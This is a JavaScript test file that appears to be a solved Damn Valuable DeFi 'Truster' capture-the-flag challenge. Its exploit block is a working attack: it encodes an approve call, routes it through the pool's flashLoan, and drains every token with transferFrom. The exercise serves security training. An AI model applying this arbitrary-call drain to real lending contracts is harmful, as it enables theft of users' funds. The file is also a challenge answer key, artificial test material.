const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */

        // generating function call data for token approve function call using ethers Interface
        let ABI = [ "function approve(address spender, uint256 amount) external returns (bool)" ];
        let iface = new ethers.utils.Interface(ABI);
        let data = iface.encodeFunctionData("approve", [attacker.address,TOKENS_IN_POOL]);

        // calling flashLoan function 
        await this.pool.flashLoan(TOKENS_IN_POOL,this.pool.address,this.token.address,data);

        // transfering the approved coins from pool to attacker
        await this.token.connect(attacker).transferFrom(this.pool.address,attacker.address,TOKENS_IN_POOL);

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

